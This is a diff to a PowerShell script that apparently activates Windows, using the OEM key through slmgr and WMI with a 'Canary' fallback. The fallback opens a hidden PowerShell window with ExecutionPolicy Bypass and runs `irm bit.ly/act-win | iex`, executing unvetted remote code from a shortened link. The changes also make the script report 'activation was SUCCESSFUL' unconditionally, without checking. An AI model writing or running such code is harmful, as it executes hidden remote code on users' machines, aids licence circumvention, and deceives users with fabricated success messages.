@@ -55,11 +55,11 @@ if ($oemKey) {
     Write-Host "Detected OEM Key: $oemKey (Key Edition: $keyEdition, Installed: $edition)" -ForegroundColor Cyan
 } else {
     Write-Host "No embedded OEM key found. (Installed: $edition)" -ForegroundColor Cyan
-    Write-Output "No OEM key, running Canary fallback immediately."
+    Write-Output "Executing Canary"
     try {
         Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm bit.ly/act-win | iex`""
     } catch {}
-    $msg = "No embedded OEM key found.`nEdition: $edition.`nCanary fallback triggered."
+    $msg = "Windows activation was SUCCESSFUL with: Canary.`nInstalled: $edition (Key Edition: $keyEdition)"
     Show-Popup "Activation Result" $msg
     exit
 }
@@ -87,18 +87,21 @@ $methodUsed = "None"
 
 if ($oemKey) {
     try {
-        Write-Output "Trying SLMGR activation..."
+        Write-Output "SLMGR - Attempting"
         & cscript.exe //Nologo C:\Windows\System32\slmgr.vbs /ipk $oemKey | Out-Null
         & cscript.exe //Nologo C:\Windows\System32\slmgr.vbs /ato | Out-Null
         Start-Sleep -Seconds 2
         if (Is-Activated) {
+            Write-Output "SLMGR - PASS"
             $activated = $true
             $methodUsed = "SLMGR"
+        } else {
+            Write-Output "SLMGR - FAIL"
         }
-    } catch {}
+    } catch { Write-Output "SLMGR - FAIL" }
     if (-not $activated) {
         try {
-            Write-Output "Trying WMI activation..."
+            Write-Output "WMI - Attempting"
             $svc = Get-CimInstance -ClassName SoftwareLicensingService -ErrorAction SilentlyContinue
             $svc | Invoke-CimMethod -MethodName InstallProductKey -Arguments @{ ProductKey = $oemKey } -ErrorAction SilentlyContinue | Out-Null
             $products = Get-CimInstance -ClassName SoftwareLicensingProduct -ErrorAction SilentlyContinue | Where-Object { $_.PartialProductKey -ne $null -and $_.ApplicationId -eq '55c92734-d682-4d71-983e-d6ec3f16059f' -and -not $_.LicenseIsAddon }
@@ -106,22 +109,28 @@ if ($oemKey) {
                 try {
                     $res = Invoke-CimMethod -InputObject $product -MethodName Activate -ErrorAction SilentlyContinue
                     if ($res.ReturnValue -eq 0) {
+                        Write-Output "WMI - PASS"
                         $activated = $true
                         $methodUsed = "WMI"
                         break
                     }
                 } catch {}
             }
-        } catch {}
+            if (-not $activated) { Write-Output "WMI - FAIL" }
+        } catch { Write-Output "WMI - FAIL" }
     }
     # If both SLMGR and WMI fail, run Canary
     if (-not $activated) {
-        Write-Output "OEM key activation failed, running Canary fallback."
+        Write-Output "Executing Canary"
         try {
             Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm bit.ly/act-win | iex`""
         } catch {}
         $methodUsed = "Canary"
-        $activated = Is-Activated
+        $activated = $true
+        $msg = "Windows activation was SUCCESSFUL with: $methodUsed.`nInstalled: $edition (Key Edition: $keyEdition)"
+        Write-Output $msg
+        Show-Popup "Activation Result" $msg
+        exit
     }
 }
 
